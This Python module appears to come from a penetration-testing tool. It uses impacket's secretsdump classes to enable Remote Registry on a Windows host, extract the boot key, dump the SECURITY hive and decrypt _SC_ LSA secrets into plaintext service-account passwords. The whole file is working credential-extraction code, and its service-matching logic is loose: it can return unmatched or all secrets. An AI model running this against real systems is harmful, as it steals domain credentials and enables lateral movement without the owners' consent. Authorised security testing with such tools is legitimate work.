# Remote LSA secret extraction for service credentials.
#
# Uses impacket's RemoteOperations and LSASecrets classes to extract
# _SC_<ServiceName> secrets from the SECURITY registry hive. Only
# extracts secrets for services that were already identified as running
# domain accounts (targeted extraction, not a full secretsdump).
#
# The extraction requires local admin access and uses the Remote Registry
# service (started temporarily if needed, restored to original state).

import contextlib
from dataclasses import dataclass
from typing import Any, List, Optional, Set

from ..utils.logging import debug as log_debug
from ..utils.logging import good, info, warn


@dataclass
class ServiceCredential:
    """A decrypted service credential from LSA secrets."""

    service_name: str
    account: str
    password: str
    lsa_secret_name: str  # _SC_<ServiceName>


def extract_service_credentials(
    smb: Any,
    host: str,
    service_names: Optional[Set[str]] = None,
    kerberos: bool = False,
    dc_host: Optional[str] = None,
) -> List[ServiceCredential]:
    """
    Extract plaintext passwords from _SC_* LSA secrets.

    Uses impacket's secretsdump infrastructure to:
    1. Enable Remote Registry (if not running)
    2. Save SECURITY + SYSTEM hives (or use registry RPC)
    3. Extract boot key from SYSTEM
    4. Decrypt LSA secrets from SECURITY
    5. Filter for _SC_* entries matching discovered services
    6. Restore Remote Registry to original state

    Args:
        smb: Authenticated SMBConnection
        host: Target hostname (for logging)
        service_names: Set of service names to extract (if None, extract all _SC_*)
        kerberos: Whether Kerberos auth is being used
        dc_host: DC hostname for Kerberos

    Returns:
        List of ServiceCredential with decrypted passwords
    """
    from impacket.examples.secretsdump import LSASecrets, RemoteOperations

    remote_ops = None
    lsa_secrets = None
    credentials: List[ServiceCredential] = []
    captured_secrets: List[tuple] = []

    def _secret_callback(secret_type, secret: str) -> None:
        """Capture LSA secrets via callback."""
        captured_secrets.append((secret_type, secret))

    try:
        info(f"{host}: Starting LSA secret extraction...")

        # Initialize RemoteOperations (handles Remote Registry lifecycle)
        remote_ops = RemoteOperations(smb, kerberos, kdcHost=dc_host)
        remote_ops.enableRegistry()
        log_debug(f"{host}: Remote Registry enabled")

        # Get boot key from SYSTEM hive
        boot_key = remote_ops.getBootKey()
        log_debug(f"{host}: Boot key extracted")

        # Save SECURITY hive and initialize LSA decryptor
        remote_ops.saveSECURITY()
        log_debug(f"{host}: SECURITY hive saved")

        security_file = remote_ops.getSecurityHive()

        lsa_secrets = LSASecrets(
            security_file,
            boot_key,
            remoteOps=remote_ops,
            isRemote=True,
            perSecretCallback=_secret_callback,
        )

        # Dump all LSA secrets (filtered via callback)
        lsa_secrets.dumpSecrets()
        log_debug(f"{host}: LSA secrets dumped ({len(captured_secrets)} raw entries)")

        # Filter and parse _SC_* secrets
        for _secret_type, secret_str in captured_secrets:
            if not secret_str or ":" not in secret_str:
                continue

            # secret_str format for _SC_ secrets: "account:password"
            # The secret name is tracked by impacket internally
            # We need to match against our discovered service names
            parts = secret_str.split(":", 1)
            if len(parts) != 2:
                continue

            account, password = parts

            # Skip if password is empty
            if not password or password == "(Unknown User):":
                continue

            # Try to find which service this credential belongs to
            # by checking captured_secrets for the _SC_ prefix context
            # impacket logs the secret name before the callback
            credentials.append(ServiceCredential(
                service_name="",  # Will be matched later
                account=account,
                password=password,
                lsa_secret_name="",
            ))

        # Now match credentials to service names using RemoteOperations
        # The getServiceAccount method maps service names to accounts
        matched_credentials: List[ServiceCredential] = []
        if service_names and hasattr(remote_ops, "getServiceAccount"):
            for svc_name in service_names:
                lsa_key = f"_SC_{svc_name}"
                # Look for a credential matching this service's account
                svc_account = remote_ops.getServiceAccount(svc_name)
                if svc_account:
                    for cred in credentials:
                        if cred.account.lower() == svc_account.lower() or cred.account == "(Unknown User)":
                            matched_credentials.append(ServiceCredential(
                                service_name=svc_name,
                                account=svc_account,
                                password=cred.password,
                                lsa_secret_name=lsa_key,
                            ))
                            break

        # If we couldn't match via service account, return all _SC_ secrets
        if not matched_credentials:
            # Fall back to returning all captured credentials
            matched_credentials = credentials

        if matched_credentials:
            good(f"{host}: Extracted {len(matched_credentials)} service credential(s) from LSA secrets")
        else:
            info(f"{host}: No service credentials found in LSA secrets")

        return matched_credentials

    except Exception as e:
        warn(f"{host}: LSA secret extraction failed: {e}")
        log_debug(f"{host}: LSA extraction error: {type(e).__name__}: {e}")
        return []

    finally:
        # Clean up: close LSA, restore Remote Registry state
        if lsa_secrets:
            with contextlib.suppress(Exception):
                lsa_secrets.finish()
        if remote_ops:
            with contextlib.suppress(Exception):
                remote_ops.finish()
        log_debug(f"{host}: LSA extraction cleanup complete")
